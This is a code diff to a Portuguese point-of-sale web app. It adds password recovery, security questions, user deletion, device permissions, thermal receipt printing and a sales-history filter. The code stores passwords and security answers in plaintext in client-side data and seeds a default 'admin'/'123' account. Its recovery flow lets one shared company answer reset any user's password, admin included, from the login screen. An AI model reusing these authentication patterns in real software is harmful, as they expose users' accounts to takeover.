@@ -926,7 +926,27 @@ body.mobile-mode #bottomNav button{
     <p style="font-size:12px;color:var(--muted);margin-top:10px">
       Lucas Softwares → <b>admin</b> peça sua licença ja! → <b></b>
     </p>
+      <!-- Link para recuperação de senha -->
+      <p id="forgotPassLink" style="font-size:12px;margin-top:10px;text-align:center;">
+        <a href="#" onclick="showPasswordRecovery(); return false;" style="color:var(--primary2);text-decoration:underline;">Esqueceu a senha?</a>
+      </p>
   </div>
+
+    <!-- Cartão de recuperação de senha (inicialmente oculto) -->
+    <div id="recoveryCard" class="card" style="max-width:420px;margin:auto;display:none; margin-top:10px;">
+      <h3>Recuperar Senha</h3>
+      <div class="grid">
+        <input id="rec_user" placeholder="Usuário" autocomplete="username" />
+        <button type="button" onclick="loadRecoveryQuestion()">Carregar Pergunta</button>
+        <div id="rec_question" class="small" style="margin-top:8px; min-height:18px;"></div>
+        <input id="rec_answer" type="password" placeholder="Resposta de segurança" />
+        <input id="rec_newpass" type="password" placeholder="Nova senha" />
+      </div>
+      <div class="flex" style="margin-top:10px; gap:8px; flex-wrap:wrap;">
+        <button onclick="recoverPassword()" class="button-primary">Recuperar Senha</button>
+        <button onclick="cancelRecovery()" class="button-secondary">Cancelar</button>
+      </div>
+    </div>
 </section>
 
   <!-- Modal de scanner removido desta posição: ele será renderizado dentro do systemSection -->
@@ -1328,6 +1348,7 @@ body.mobile-mode #bottomNav button{
         <div class="small" id="v_hint" style="margin-top:8px;"></div>
         <div class="flex" style="margin-top:10px;">
           <button onclick="registrarVenda()">✅ Confirmar Venda</button><span class="help-btn" onclick="showHelp('confirmarVenda')">❔</span>
+          <button id="btnPrintReceiptQuick" class="ghost" style="display:none" onclick="imprimirUltimoComprovante()">🖨 Imprimir Cupom</button>
           <!-- Botão de orçamento identificável para ser habilitado/desabilitado via preferências -->
           <button id="btnOrcamentoRapida" class="ghost" onclick="abrirOrcamentoUI()">🧾 Orçamento</button>
         </div>
@@ -1402,7 +1423,7 @@ body.mobile-mode #bottomNav button{
                  compartilha o mesmo contexto 'vendas' da venda rápida para permitir
                  leituras de código por câmera e leitores USB. -->
             <button id="btnScannerCart" type="button" class="ghost" onclick="toggleSkan('vendas')">📷 Scanner</button><span class="help-btn" onclick="showHelp('scanner')">❔</span>
-            <button id="btnPrintReceipt" class="ghost" style="display:none" onclick="imprimirUltimoComprovante()">🖨 Imprimir comprovante</button>
+            <button id="btnPrintReceipt" class="ghost" style="display:none" onclick="imprimirUltimoComprovante()">🖨 Imprimir Cupom</button>
             <!-- Botão para abrir o módulo de orçamento também na venda completa -->
             <button id="btnOrcamentoCart" class="ghost" onclick="abrirOrcamentoUI()">🧾 Orçamento</button>
           </div>
@@ -1415,10 +1436,18 @@ body.mobile-mode #bottomNav button{
     </div>
 
     <div class="card hiddenInSimple">
-      <h3>Histórico de Vendas <button id="btnVendasOrder" class="ghost small" title="Alternar ordem" style="margin-left:8px;" onclick="toggleVendasOrder()">⇅ Ordem</button></h3>
+      <div style="display:flex; align-items:center; justify-content:space-between; gap:8px; flex-wrap:wrap; margin-bottom:6px;">
+        <h3 style="margin:0; display:flex; align-items:center; gap:8px; flex-wrap:wrap;">Histórico de Vendas <button id="btnVendasOrder" class="ghost small" title="Alternar ordem" style="margin-left:0;" onclick="toggleVendasOrder()">⇅ Ordem</button></h3>
+        <select id="vendasFiltroPeriodo" class="ghost small" title="Filtrar histórico de vendas por período" onchange="applyVendasHistoricoFilter()" style="min-width:92px; max-width:120px; padding:6px 10px; border-radius:10px;">
+          <option value="hoje">Hoje</option>
+          <option value="semana">Semana</option>
+          <option value="mes">Mês</option>
+          <option value="ano">Ano</option>
+        </select>
+      </div>
       <table>
         <thead>
-          <tr><th>Data</th><th>Produto</th><th>Qtd</th><th>Total</th><th>Pagamento</th><th>Status</th><th>Ação</th></tr></thead>
+          <tr id="trVendasHead"><th>Data</th><th id="thVendasVendedor" style="display:none;">Vendedor</th><th>Produto</th><th>Qtd</th><th>Total</th><th>Pagamento</th><th>Status</th><th>Ação</th></tr></thead>
         <tbody id="tVendas"></tbody>
       </table>
       <div class="small" style="margin-top:8px;">
@@ -1615,6 +1644,9 @@ body.mobile-mode #bottomNav button{
           <option value="caixa">Caixa</option>
           <option value="consulta">Consulta</option>
         </select>
+        <!-- Campos de segurança adicionais para recuperação e confirmação -->
+        <input id="u_sq" placeholder="Pergunta de segurança" />
+        <input id="u_sa" type="password" placeholder="Resposta de segurança" />
       </div><br>
       <button onclick="addUser()">Criar Usuário</button>
 
@@ -1641,7 +1673,11 @@ body.mobile-mode #bottomNav button{
           <label><input type="checkbox" id="perm_closeBox" /> Fechar caixa</label>
           <label><input type="checkbox" id="perm_exportImportBackup" /> Backup/import</label>
           <label><input type="checkbox" id="perm_manageUsers" /> Gerenciar usuários</label>
+          <label><input type="checkbox" id="perm_manageDevices" /> Gerenciar dispositivos</label>
           <label><input type="checkbox" id="edit_active" /> Ativo</label>
+          <!-- Campos de segurança para edição: pergunta e resposta de segurança do usuário -->
+          <input id="edit_sq" placeholder="Pergunta de segurança" />
+          <input id="edit_sa" type="password" placeholder="Resposta de segurança" />
         </div>
         <br>
         <button onclick="saveUserEdit()" class="button-primary">Salvar Alterações</button>
@@ -1683,6 +1719,17 @@ body.mobile-mode #bottomNav button{
       <h3>📌 Dados salvos</h3>
       <div class="small" id="p_view"></div>
     </div>
+
+  <!-- Cartão separado para configurar pergunta e resposta de segurança da empresa -->
+  <div class="card" id="empresaSecurityCard">
+    <h3>🔐 Recuperação e Segurança</h3>
+    <p class="small">Configure abaixo a pergunta e a resposta de segurança. Elas serão utilizadas para recuperar senhas esquecidas.</p>
+    <div class="grid" style="margin-top:6px;">
+      <input id="p_sq" placeholder="Pergunta de segurança" />
+      <input id="p_sa" type="password" placeholder="Resposta de segurança" />
+    </div>
+    <div class="small" style="margin-top:6px;">Estas informações são usadas quando um usuário esquece a senha. Somente administradores podem alterá‑las.</div>
+  </div>
   </section>
 
   <!-- AJUSTES -->
@@ -2118,14 +2165,15 @@ body.mobile-mode #bottomNav button{
         <label style="display:flex; flex-direction:column;">
           Impressora
           <select id="cfg_printerDevice" onchange="setPrinterDevice(this.value)">
-            <option value="default">Padrão</option>
-            <option value="thermal">Térmica (80mm)</option>
+            <option value="none">Nenhuma</option>
+            <option value="common">Impressora comum</option>
+            <option value="thermal">Impressora térmica</option>
           </select>
         </label>
       </div>
       <div class="small" style="margin-top:6px;">
         Selecione o dispositivo que será usado para leitura de códigos (câmera ou USB) e a impressora
-        para recibos. A opção térmica ajusta a largura do comprovante para bobinas de 80&nbsp;mm.
+        para recibos. A opção térmica ativa o cupom automático em desktop e mantém botão manual no celular/tablet.
       </div>
     </div><!-- fim ajustePreferencias -->
 
@@ -2852,6 +2900,7 @@ const DEFAULT_PERMISSIONS = {
     closeBox: true,
     exportImportBackup: true,
     manageUsers: true
+    ,manageDevices: true
   },
   operador: {
     editCost: false,
@@ -2860,7 +2909,8 @@ const DEFAULT_PERMISSIONS = {
     cancelSale: false,
     closeBox: false,
     exportImportBackup: false,
-    manageUsers: false
+    manageUsers: false,
+    manageDevices: false
   },
   caixa: {
     editCost: false,
@@ -2869,7 +2919,8 @@ const DEFAULT_PERMISSIONS = {
     cancelSale: false,
     closeBox: true,
     exportImportBackup: false,
-    manageUsers: false
+    manageUsers: false,
+    manageDevices: false
   },
   consulta: {
     editCost: false,
@@ -2878,7 +2929,8 @@ const DEFAULT_PERMISSIONS = {
     cancelSale: false,
     closeBox: false,
     exportImportBackup: false,
-    manageUsers: false
+    manageUsers: false,
+    manageDevices: false
   }
 };
 // Assegura que um usuário tenha um objeto de permissões completo. Se `perms` for
@@ -2932,12 +2984,16 @@ function normalizeDB(d){
   // --- Novos campos no metadado ---
   // Definir dispositivo de scanner e impressora padrão caso não existam.
   // O scanner pode ser "camera" (leitor via câmera) ou "usb" (leitor tipo teclado).
-  // A impressora pode ser "default" ou "thermal" para recibos em bobina.
+  // A impressora pode ser "none", "common" ou "thermal" para recibos/cupom.
   if(typeof d._meta.scanDevice === 'undefined') d._meta.scanDevice = 'camera';
-  if(typeof d._meta.printerDevice === 'undefined') d._meta.printerDevice = 'default';
+  if(typeof d._meta.printerDevice === 'undefined') d._meta.printerDevice = 'common';
+  if(d._meta.printerDevice === 'default') d._meta.printerDevice = 'common';
 
   d.usuarios = Array.isArray(d.usuarios) ? d.usuarios : [{user:"admin",pass:"123",role:"admin"}];
   d.empresa  = d.empresa && typeof d.empresa==="object" ? d.empresa : {nome:"",cnpj:"",contato:""};
+  // Garante que a empresa tenha campos de segurança para recuperação de senha
+  if(typeof d.empresa.sq === 'undefined') d.empresa.sq = '';
+  if(typeof d.empresa.sa === 'undefined') d.empresa.sa = '';
   d.estoque  = Array.isArray(d.estoque) ? d.estoque : [];
   d.vendas   = Array.isArray(d.vendas) ? d.vendas : [];
   d.caixa    = Array.isArray(d.caixa) ? d.caixa : [];
@@ -3395,6 +3451,36 @@ function aplicarRestricoesPorPerfil(){
   if(active && active.id === "usuarios" && !hasPerm('manageUsers')){
     show("dashboard");
   }
+
+  // Oculta opções administrativas adicionais se o usuário não for administrador
+  try{
+    if(currentUser && currentUser.role !== 'admin'){
+      ['btnCfg_empresa','btnCfg_aparencia','btnCfg_dados','btnCfg_ferramentas'].forEach(function(id){
+        const el = document.getElementById(id);
+        if(el) el.style.display = 'none';
+      });
+      ['perfil','ajusteTema','ajusteArquivo','ajusteExtras','ajustePreferencias','ajusteComercio','ajusteInterface'].forEach(function(id){
+        const el = $(id);
+        if(el) el.style.display = 'none';
+      });
+    }
+  }catch(_e){}
+
+  // Desabilita seleção de dispositivos se o usuário não tiver permissão para gerenciá-los
+  try{
+    if(!hasPerm('manageDevices')){
+      const selScan = document.getElementById('cfg_scanDevice');
+      const selPrinter = document.getElementById('cfg_printerDevice');
+      if(selScan) selScan.disabled = true;
+      if(selPrinter) selPrinter.disabled = true;
+    }else{
+      // Caso tenha permissão, habilita controles
+      const selScan = document.getElementById('cfg_scanDevice');
+      const selPrinter = document.getElementById('cfg_printerDevice');
+      if(selScan) selScan.disabled = false;
+      if(selPrinter) selPrinter.disabled = false;
+    }
+  }catch(_e){}
 }
 
 /* ========== Login / Navegação ========== */
@@ -3472,6 +3558,87 @@ function logout(){
   $("systemSection").style.display = "none";
   $("loginSection").style.display = "block";
   toast("Você saiu do sistema.", "warn");
+}
+
+// ====== Recuperação de Senha ======
+// Exibe o cartão de recuperação de senha e oculta o cartão de login
+function showPasswordRecovery(){
+  try{
+    const recCard = document.getElementById('recoveryCard');
+    const loginCard = document.querySelector('#loginSection > .card');
+    const link = document.getElementById('forgotPassLink');
+    if(recCard){ recCard.style.display = 'block'; }
+    if(loginCard){ loginCard.style.display = 'none'; }
+    if(link){ link.style.display = 'none'; }
+    // Limpa campos de recuperação
+    if($('rec_user')) $('rec_user').value = '';
+    if($('rec_answer')) $('rec_answer').value = '';
+    if($('rec_newpass')) $('rec_newpass').value = '';
+    const q = $('rec_question');
+    if(q) q.textContent = '';
+  }catch(e){ console.warn('showPasswordRecovery error', e); }
+}
+
+// Cancela a recuperação e retorna ao cartão de login
+function cancelRecovery(){
+  try{
+    const recCard = document.getElementById('recoveryCard');
+    const loginCard = document.querySelector('#loginSection > .card');
+    const link = document.getElementById('forgotPassLink');
+    if(recCard){ recCard.style.display = 'none'; }
+    if(loginCard){ loginCard.style.display = 'block'; }
+    if(link){ link.style.display = 'block'; }
+  }catch(e){ console.warn('cancelRecovery error', e); }
+}
+
+// Carrega a pergunta de segurança com base no usuário informado
+function loadRecoveryQuestion(){
+  try{
+    const uname = s($('rec_user')?.value);
+    if(isEmpty(uname)){
+      toast('Informe o usuário.', 'warn');
+      return;
+    }
+    const u = (db.usuarios || []).find(x => s(x.user) === uname);
+    if(!u){ toast('Usuário não encontrado.', 'bad'); return; }
+    // Prioriza pergunta da empresa para recuperação. Se ausente, usa do usuário
+    let question = db.empresa && db.empresa.sq ? String(db.empresa.sq) : '';
+    if(!question){ question = u.sq || ''; }
+    if(!question){
+      $('rec_question').textContent = 'Nenhuma pergunta configurada.';
+    }else{
+      $('rec_question').textContent = question;
+    }
+  }catch(e){ console.warn('loadRecoveryQuestion error', e); toast('Erro ao carregar pergunta.', 'bad'); }
+}
+
+// Valida a resposta e redefine a senha do usuário
+function recoverPassword(){
+  try{
+    const uname = s($('rec_user')?.value);
+    const ans = s($('rec_answer')?.value);
+    const newpass = s($('rec_newpass')?.value);
+    if(isEmpty(uname) || isEmpty(ans) || isEmpty(newpass)){
+      toast('Preencha todos os campos.', 'bad');
+      return;
+    }
+    const u = (db.usuarios || []).find(x => s(x.user) === uname);
+    if(!u){ toast('Usuário não encontrado.', 'bad'); return; }
+    // Obtém resposta correta: prioriza empresa
+    let correct = '';
+    if(db.empresa && db.empresa.sa){ correct = s(db.empresa.sa); }
+    if(!correct && u.sa){ correct = s(u.sa); }
+    if(!correct){ toast('Pergunta de segurança não configurada.', 'bad'); return; }
+    if(s(ans) !== s(correct)){
+      toast('Resposta incorreta.', 'bad');
+      return;
+    }
+    u.pass = newpass;
+    save();
+    addAudit('recoverPassword', 'Recuperou senha do usuário ' + uname);
+    toast('Senha redefinida com sucesso!', 'ok');
+    cancelRecovery();
+  }catch(e){ console.warn('recoverPassword error', e); toast('Erro ao redefinir senha.', 'bad'); }
 }
 function show(id){
   // Registrar a seção como última visitada (exceto quando abrindo o scanner)
@@ -3559,16 +3726,25 @@ function addUser(){
   const user = sanitizeInputString(s($("u_user")?.value));
   const pass = sanitizeInputString(s($("u_pass")?.value));
   const role = sanitizeInputString(s($("u_role")?.value));
+  // Pergunta e resposta de segurança são opcionais
+  const sq = sanitizeInputString(s($("u_sq")?.value));
+  const sa = sanitizeInputString(s($("u_sa")?.value));
   if(isEmpty(user) || isEmpty(pass) || isEmpty(role)){ toast("Preencha usuário, senha e perfil.", "warn"); return; }
   if(hasUser(user)){ toast("Esse usuário já existe.", "bad"); return; }
 
   const perms = ensureUserPerms(role, null);
-  db.usuarios.push({ user, pass, role, owner:s(currentUser.user)||"admin", ativo:true, criadoEm: nowDateTime(), perms });
+  // Inclui sq/sa apenas se fornecidos
+  const userObj = { user, pass, role, owner:s(currentUser.user)||"admin", ativo:true, criadoEm: nowDateTime(), perms };
+  if(sq) userObj.sq = sq;
+  if(sa) userObj.sa = sa;
+  db.usuarios.push(userObj);
   save(); render(true);
   // Registrar auditoria de criação de usuário
   addAudit('createUser', 'Criou usuário ' + user);
   if($("u_user")) $("u_user").value = "";
   if($("u_pass")) $("u_pass").value = "";
+  if($("u_sq")) $("u_sq").value = "";
+  if($("u_sa")) $("u_sa").value = "";
   toast('Usuário criado!', 'ok');
 }
 
@@ -3584,6 +3760,9 @@ function editUser(username){
   if($('edit_username')) $('edit_username').value = usr.user;
   if($('edit_role')) $('edit_role').value = usr.role;
   if($('edit_active')) $('edit_active').checked = !!usr.ativo;
+  // Preenche campos de pergunta e resposta de segurança, se existirem
+  if($('edit_sq')) $('edit_sq').value = usr.sq || '';
+  if($('edit_sa')) $('edit_sa').value = usr.sa || '';
   const perms = ensureUserPerms(usr.role, usr.perms);
   Object.keys(DEFAULT_PERMISSIONS.admin).forEach(k=>{
     const cb = $('perm_' + k);
@@ -3597,6 +3776,11 @@ function saveUserEdit(){
   const rSel = $('edit_role') ? $('edit_role').value : usr.role;
   usr.role = rSel;
   usr.ativo = $('edit_active') ? !!$('edit_active').checked : true;
+  // Atualiza pergunta e resposta de segurança do usuário
+  try{
+    if($('edit_sq')) usr.sq = sanitizeInputString(s($('edit_sq').value));
+    if($('edit_sa')) usr.sa = sanitizeInputString(s($('edit_sa').value));
+  }catch(_e){}
   const perms = {};
   Object.keys(DEFAULT_PERMISSIONS.admin).forEach(k=>{
     const cb = $('perm_' + k);
@@ -3639,6 +3823,55 @@ function resetUserPass(username){
   save();
   addAudit('resetUserPass', 'Resetou senha de ' + u.user);
   toast('Senha redefinida!', 'ok');
+}
+
+// Exclui permanentemente um usuário. Exige permissão de gerenciamento e confirmação dupla.
+function deleteUser(username){
+  try{
+    if(!hasPerm('manageUsers')){ toast('Sem permissão.', 'bad'); return; }
+    const uname = String(username || '').trim();
+    if(!uname){ toast('Usuário inválido.', 'bad'); return; }
+    // Impede que o usuário exclua a si mesmo
+    if(currentUser && s(currentUser.user) === s(uname)){
+      toast('Você não pode excluir seu próprio usuário.', 'bad');
+      return;
+    }
+    const list = db.usuarios || [];
+    const idx = list.findIndex(u => s(u.user) === s(uname));
+    if(idx < 0){ toast('Usuário não encontrado.', 'bad'); return; }
+    const u = list[idx];
+    // Bloqueia exclusão do último administrador ativo
+    if(u.role === 'admin'){
+      const countAdmins = list.filter(x => s(x.user) !== s(uname) && x.role === 'admin' && (x.ativo !== false)).length;
+      if(countAdmins === 0){
+        toast('Não é possível excluir o último administrador.', 'bad');
+        return;
+      }
+    }
+    // Confirmação principal
+    if(!confirm('Tem certeza que deseja excluir o usuário ' + uname + '? Esta ação é irreversível.')){
+      return;
+    }
+    // Verificação da pergunta de segurança, se definida
+    if(u.sq){
+      const ans = prompt('Pergunta de segurança: ' + u.sq + '\nDigite a resposta para confirmar a exclusão.', '');
+      if(ans === null) return;
+      const trimmedAns = sanitizeInputString(ans);
+      if(trimmedAns !== s(u.sa)){
+        toast('Resposta incorreta. Exclusão cancelada.', 'bad');
+        return;
+      }
+    }
+    // Remover usuário
+    list.splice(idx, 1);
+    save();
+    addAudit('deleteUser', 'Excluiu usuário ' + uname);
+    render(true);
+    toast('Usuário excluído!', 'ok');
+  }catch(e){
+    console.warn('deleteUser error', e);
+    toast('Erro ao excluir usuário.', 'bad');
+  }
 }
 
 /* ========== Estoque (Edição) ========== */
@@ -4017,6 +4250,11 @@ function registrarVenda(){
     total_c,
     pag,
     lucro_c,
+    usuario: currentUser && currentUser.user ? currentUser.user : "sistema",
+    vendedor: currentUser && currentUser.user ? currentUser.user : "sistema",
+    responsavel: currentUser && currentUser.user ? currentUser.user : "sistema",
+    timestamp: Date.now(),
+    dataIso: new Date().toISOString(),
     descItem_p: descItemPct,
     descTotal_p: descTotalPct,
     cancelada:false,
@@ -4039,13 +4277,6 @@ function registrarVenda(){
   });
 
   save(); render(true);
-  // limpa campos da venda rápida
-  if($("v_qtd")) $("v_qtd").value = "";
-  if($("v_servico")) $("v_servico").value = "";
-  if($("v_recebido")) $("v_recebido").value = "";
-  if($("v_troco")) $("v_troco").value = "";
-  if($("v_desc_item")) $("v_desc_item").value = "";
-  if($("v_desc_total")) $("v_desc_total").value = "";
   // Gera recibo e nota fiscal se preferências estiverem habilitadas
   try{
     const prodSel = p;
@@ -4053,18 +4284,194 @@ function registrarVenda(){
       receiptId: 'REC-' + Date.now(),
       date: agora,
       payment: pag,
+      vendor: currentUser && currentUser.user ? currentUser.user : 'sistema',
       items: [{ cod: p.cod, nome: p.nome, qtd, preco_c: p.preco_c, total_c }],
       subtotal_c: p.preco_c * qtd,
       service_c: servico_c,
       total_c: total_c,
-      received_c: (pag === 'dinheiro' ? parseMoneyToCents($("v_recebido")?.value) : total_c),
+      received_c: (pag === 'dinheiro' ? recebido_c : total_c),
       change_c: (pag === 'dinheiro' ? (typeof troco_c !== 'undefined' ? troco_c : 0) : 0),
       groupId
     };
     lastReceipt = saleReceipt;
     maybeEmitNotaFiscal(saleReceipt);
   }catch(_err){}
+  resetVendaInput('rapida');
+  updatePrintCupomButtonsVisibility();
+  try{ triggerThermalPrint(lastReceipt); }catch(_e){}
   toast("Venda registrada!", "ok");
+}
+
+
+function resetVendaInput(contexto){
+  try{
+    const target = String(contexto || '').toLowerCase();
+    const clearValue = function(id, fallback){
+      const el = $(id);
+      if(el) el.value = typeof fallback === 'undefined' ? '' : fallback;
+      return el;
+    };
+
+    if(target === 'rapida'){
+      clearValue('v_busca', '');
+      clearValue('v_qtd', '');
+      const recebido = clearValue('v_recebido', '');
+      clearValue('v_troco', '');
+      clearValue('v_servico', '');
+      clearValue('v_desc_item', '');
+      clearValue('v_desc_total', '');
+      const hint = $('v_hint');
+      if(hint) hint.textContent = '';
+      const campoCodigo = $('v_busca');
+      if(campoCodigo && typeof campoCodigo.focus === 'function') campoCodigo.focus();
+      if(recebido && typeof recebido.blur === 'function') recebido.blur();
+      return;
+    }
+
+    if(target === 'scanner'){
+      clearValue('manual_scan_code', '');
+      clearValue('scan_service', '');
+      clearValue('scan_discount', '');
+      clearValue('scan_recebido', '');
+      lastDetectedCode = '';
+      const campoScan = $('manual_scan_code');
+      if(campoScan && typeof campoScan.focus === 'function') campoScan.focus();
+      return;
+    }
+
+    clearValue('c_busca', '');
+    clearValue('c_qtd', '1');
+    clearValue('c_servico', '');
+    clearValue('c_recebido', '');
+    clearValue('c_troco', '');
+    const hint = $('c_hint');
+    if(hint) hint.textContent = '';
+    const campoCodigo = $('c_busca');
+    if(campoCodigo && typeof campoCodigo.focus === 'function') campoCodigo.focus();
+  }catch(e){
+    console.warn('resetVendaInput error', e);
+    toast('Erro ao limpar campos da venda', 'bad');
+  }
+}
+
+function getCupomEmpresaDados(){
+  const emp = db && db.empresa ? db.empresa : {};
+  return {
+    nome: String(emp.nome || 'EMPRESA'),
+    cnpj: String(emp.cnpj || '').trim(),
+    contato: String(emp.contato || '').trim()
+  };
+}
+
+function buildThermalReceiptHTML(venda){
+  const receipt = venda || lastReceipt || {};
+  const emp = getCupomEmpresaDados();
+  const dateRaw = receipt.date ? new Date(String(receipt.date).replace(' ', 'T')) : new Date();
+  const dt = isNaN(dateRaw.getTime()) ? new Date() : dateRaw;
+  const data = dt.toLocaleDateString('pt-BR');
+  const hora = dt.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
+  const items = Array.isArray(receipt.items) ? receipt.items : [];
+  const pagamento = receipt.payment || receipt.pag || '-';
+  const vendedor = receipt.vendor || receipt.vendedor || receipt.usuario || (currentUser && currentUser.user ? currentUser.user : 'sistema');
+  const linhas = items.map(function(it){
+    const qtd = clampInt(it.qtd, 0);
+    const nome = escapeHTML(String(it.nome || 'Item').slice(0, 24));
+    const total = 'R$' + centsToBR(moneyOf(it, 'total_c', 'total'));
+    return `<div class="item-line"><span>${qtd}x ${nome}</span><span>${total}</span></div>`;
+  }).join('') || '<div class="item-line"><span>Sem itens</span><span>-</span></div>';
+
+  return `<!doctype html>
+<html lang="pt-br">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Cupom ${escapeHTML(receipt.receiptId || 'VENDA')}</title>
+<style>
+  :root{ color-scheme: light; }
+  html, body{ margin:0; padding:0; background:#fff; color:#000; }
+  body{ font-family: monospace; font-size: 11px; }
+  .thermal-receipt{ width:72mm; max-width:72mm; padding:4mm 3mm; box-sizing:border-box; }
+  .center{ text-align:center; }
+  .line{ border-top:1px dashed #000; margin:6px 0; }
+  .item-line, .total-line{ display:flex; justify-content:space-between; gap:8px; align-items:flex-start; }
+  .item-line span:first-child, .total-line span:first-child{ flex:1; }
+  .footer{ margin-top:8px; text-align:center; }
+  .screen-actions{ padding:8px 0 0; display:flex; gap:8px; justify-content:center; }
+  .screen-actions button{ font-family: monospace; font-size: 11px; padding:6px 8px; }
+  @page{ size:auto; margin:0; }
+  @media print{
+    body{ width:72mm; }
+    .screen-actions, nav, button, input, select, textarea, .app, .sidebar, .toolbar, .menu, .actions, .navigation{ display:none !important; }
+  }
+</style>
+</head>
+<body>
+  <div class="thermal-receipt">
+    <div class="center">
+      <div><strong>${escapeHTML(emp.nome)}</strong></div>
+      ${emp.cnpj ? `<div>CNPJ ${escapeHTML(emp.cnpj)}</div>` : ''}
+      ${emp.contato ? `<div>${escapeHTML(emp.contato)}</div>` : ''}
+    </div>
+    <div class="line"></div>
+    <div>Data: ${escapeHTML(data)}</div>
+    <div>Hora: ${escapeHTML(hora)}</div>
+    <div class="line"></div>
+    <div><strong>ITENS</strong></div>
+    ${linhas}
+    <div class="line"></div>
+    <div class="total-line"><span><strong>TOTAL</strong></span><span><strong>R$${centsToBR(receipt.total_c || 0)}</strong></span></div>
+    <div>Pagamento: ${escapeHTML(pagamento)}</div>
+    <div>Vendedor: ${escapeHTML(vendedor)}</div>
+    <div class="footer">
+      <div>Obrigado pela preferência</div>
+      <div class="line"></div>
+    </div>
+    <div class="screen-actions">
+      <button onclick="window.print()">Imprimir</button>
+      <button onclick="window.close()">Fechar</button>
+    </div>
+  </div>
+</body>
+</html>`;
+}
+
+function triggerThermalPrint(venda){
+  try{
+    if(!isThermalPrinterEnabled()) return false;
+    if(isMobilePrintContext()){
+      updatePrintCupomButtonsVisibility();
+      return false;
+    }
+    const html = buildThermalReceiptHTML(venda || lastReceipt);
+    const blob = new Blob([html], { type: 'text/html;charset=utf-8' });
+    const url = URL.createObjectURL(blob);
+    const w = window.open(url, '_blank', 'noopener,width=420,height=640');
+    if(!w){
+      throw new Error('Popup bloqueado');
+    }
+    const cleanup = function(){
+      try{ URL.revokeObjectURL(url); }catch(_e){}
+    };
+    w.addEventListener('load', function(){
+      try{
+        w.focus();
+        w.print();
+        setTimeout(function(){
+          try{ w.close(); }catch(_e){}
+          cleanup();
+        }, 450);
+      }catch(err){
+        console.warn('thermal print load error', err);
+        cleanup();
+      }
+    });
+    setTimeout(cleanup, 15000);
+    return true;
+  }catch(e){
+    console.warn('triggerThermalPrint error', e);
+    toast('Falha ao imprimir cupom', 'bad');
+    return false;
+  }
 }
 
 function cancelarVenda(id){
@@ -4341,7 +4748,132 @@ let carrinho = [];
 // Controle da ordem do histórico de vendas. Quando verdadeiro (padrão),
 // as vendas mais recentes aparecem primeiro; quando falso, o mais antigo aparece primeiro.
 let vendasOrderDesc = true;
+let vendasFiltroPeriodo = "hoje";
 let lastReceipt = null;
+
+function isAdminHistoricoVendas(){
+  try{ return !!(currentUser && currentUser.role === "admin"); }catch(_e){ return false; }
+}
+function getVendasFiltroPeriodoEfetivo(){
+  return isAdminHistoricoVendas() ? (vendasFiltroPeriodo || "hoje") : "hoje";
+}
+function getRangeHoje(){
+  const now = new Date();
+  return {
+    start: new Date(now.getFullYear(), now.getMonth(), now.getDate(), 0, 0, 0, 0).getTime(),
+    end: new Date(now.getFullYear(), now.getMonth(), now.getDate(), 23, 59, 59, 999).getTime()
+  };
+}
+function getRangeSemana(){
+  const now = new Date();
+  return {
+    start: new Date(now.getFullYear(), now.getMonth(), now.getDate() - 6, 0, 0, 0, 0).getTime(),
+    end: new Date(now.getFullYear(), now.getMonth(), now.getDate(), 23, 59, 59, 999).getTime()
+  };
+}
+function getRangeMes(){
+  const now = new Date();
+  return {
+    start: new Date(now.getFullYear(), now.getMonth(), 1, 0, 0, 0, 0).getTime(),
+    end: new Date(now.getFullYear(), now.getMonth() + 1, 0, 23, 59, 59, 999).getTime()
+  };
+}
+function getRangeAno(){
+  const now = new Date();
+  return {
+    start: new Date(now.getFullYear(), 0, 1, 0, 0, 0, 0).getTime(),
+    end: new Date(now.getFullYear(), 11, 31, 23, 59, 59, 999).getTime()
+  };
+}
+function getRangeByPeriodo(periodo){
+  switch(String(periodo || "hoje").toLowerCase()){
+    case "semana": return getRangeSemana();
+    case "mes": return getRangeMes();
+    case "ano": return getRangeAno();
+    case "hoje":
+    default: return getRangeHoje();
+  }
+}
+function parseHistoricoVendaTimestamp(venda){
+  try{
+    if(venda && Number.isFinite(Number(venda.timestamp))) return Number(venda.timestamp);
+    if(venda && venda.dataIso){
+      const isoTime = new Date(venda.dataIso).getTime();
+      if(!isNaN(isoTime)) return isoTime;
+    }
+    const raw = venda ? String(venda.data || "").trim() : "";
+    if(!raw) return NaN;
+    const isoLike = new Date(raw.replace(' ', 'T')).getTime();
+    if(!isNaN(isoLike)) return isoLike;
+    const m = raw.match(/^(\d{1,2})\/(\d{1,2})\/(\d{4})(?:,?\s+(\d{1,2}):(\d{2})(?::(\d{2}))?)?$/);
+    if(m){
+      const dia = Number(m[1]);
+      const mes = Number(m[2]) - 1;
+      const ano = Number(m[3]);
+      const hh = Number(m[4] || 0);
+      const mm = Number(m[5] || 0);
+      const ss = Number(m[6] || 0);
+      return new Date(ano, mes, dia, hh, mm, ss, 0).getTime();
+    }
+  }catch(_e){}
+  return NaN;
+}
+function getVendaResponsavelHistorico(venda){
+  try{
+    const direto = s(venda && (venda.usuario || venda.vendedor || venda.responsavel));
+    if(direto) return direto;
+    const gid = s(venda && venda.groupId);
+    if(!gid || !Array.isArray(db && db.caixa)) return "";
+    const mov = (db.caixa || []).find(function(item){ return s(item.groupId) === gid && s(item.responsavel); });
+    return s(mov && mov.responsavel);
+  }catch(_e){
+    return "";
+  }
+}
+function filtrarHistoricoVendas(vendas){
+  const lista = Array.isArray(vendas) ? vendas.slice() : [];
+  const periodo = getVendasFiltroPeriodoEfetivo();
+  const range = getRangeByPeriodo(periodo);
+  const usuarioAtual = s(currentUser && currentUser.user);
+  return lista.filter(function(venda){
+    const ts = parseHistoricoVendaTimestamp(venda);
+    if(!Number.isFinite(ts)) return false;
+    if(ts < range.start || ts > range.end) return false;
+    if(!isAdminHistoricoVendas()){
+      return s(getVendaResponsavelHistorico(venda)) === usuarioAtual;
+    }
+    return true;
+  });
+}
+function syncVendasFiltroUI(){
+  try{
+    const sel = $("vendasFiltroPeriodo");
+    if(!sel) return;
+    const admin = isAdminHistoricoVendas();
+    const efetivo = getVendasFiltroPeriodoEfetivo();
+    sel.value = efetivo;
+    sel.disabled = !admin;
+    sel.title = admin ? 'Filtrar histórico de vendas por período' : 'Funcionário visualiza apenas o histórico de hoje';
+  }catch(_e){}
+}
+function syncVendasHistoricoHead(){
+  try{
+    const th = $("thVendasVendedor");
+    if(th) th.style.display = isAdminHistoricoVendas() ? '' : 'none';
+  }catch(_e){}
+}
